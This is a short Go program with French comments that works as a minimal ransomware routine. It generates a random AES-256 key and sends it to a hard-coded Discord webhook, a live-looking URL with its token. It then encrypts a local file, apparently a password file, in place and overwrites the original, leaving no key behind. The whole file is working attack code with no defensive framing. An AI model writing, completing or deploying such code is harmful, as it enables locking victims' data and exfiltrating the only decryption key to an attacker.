package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
)

// Génère une clé AES aléatoire
func generateKey() ([]byte, error) {
	key := make([]byte, 32) // 32 bytes = 256 bits pour AES-256
	_, err := rand.Read(key)
	if err != nil {
		return nil, err
	}
	return key, nil
}

// Envoie la clé sur un webhook Discord
func sendKeyToDiscord(webhookURL string, key []byte) error {
	// Convertir la clé en chaîne hexadécimale
	keyHex := hex.EncodeToString(key)

	// Construire le message JSON pour Discord
	payload := fmt.Sprintf(`{"content": "Voici la clé de chiffrement : %s"}`, keyHex)

	// Effectuer une requête POST vers le webhook
	resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer([]byte(payload)))
	if err != nil {
		return fmt.Errorf("erreur lors de l'envoi de la requête au webhook : %v", err)
	}
	defer resp.Body.Close()

	// Vérifier la réponse du serveur
	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusNoContent {
		return fmt.Errorf("le webhook a retourné un code d'erreur : %d", resp.StatusCode)
	}

	return nil
}

// Chiffre un fichier et écrase le fichier d'origine
func encryptFileInPlace(filePath string, key []byte) error {
	// Lire le contenu du fichier
	plainText, err := ioutil.ReadFile(filePath)
	if err != nil {
		return fmt.Errorf("erreur lors de la lecture du fichier : %v", err)
	}

	// Créer un bloc AES
	block, err := aes.NewCipher(key)
	if err != nil {
		return fmt.Errorf("erreur lors de la création du bloc AES : %v", err)
	}

	// Générer un vecteur d'initialisation (IV)
	cipherText := make([]byte, aes.BlockSize+len(plainText))
	iv := cipherText[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return fmt.Errorf("erreur lors de la génération de l'IV : %v", err)
	}

	// Chiffrer les données
	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(cipherText[aes.BlockSize:], plainText)

	// Écrire le contenu chiffré dans le même fichier
	if err := ioutil.WriteFile(filePath, cipherText, 0644); err != nil {
		return fmt.Errorf("erreur lors de l'écriture du fichier chiffré : %v", err)
	}

	return nil
}

func main() {
	// Chemin du fichier à chiffrer
	filePath := "/Users/dylan/Documents/mdp.txt"

	// URL du webhook Discord (à remplacer par votre propre URL)
	webhookURL := "https://discord.com/api/webhooks/1308715252929794108/GD9i4jgkGK6kI74Sf9F-3okXfF-GrCQpTdke40ohLN6c7qq0QKtji27ztSp1qBArcjRk"

	// Générer une clé
	key, err := generateKey()
	if err != nil {
		fmt.Println("Erreur lors de la génération de la clé :", err)
		return
	}

	// Envoyer la clé au webhook Discord
	if err := sendKeyToDiscord(webhookURL, key); err != nil {
		fmt.Println("Erreur lors de l'envoi de la clé au webhook Discord :", err)
		return
	}
	fmt.Println("Clé envoyée au webhook Discord avec succès.")

	// Chiffrement
	fmt.Println("Chiffrement du fichier :", filePath)
	if err := encryptFileInPlace(filePath, key); err != nil {
		fmt.Println("Erreur lors du chiffrement :", err)
		return
	}
	fmt.Println("Fichier chiffré avec succès.")
}
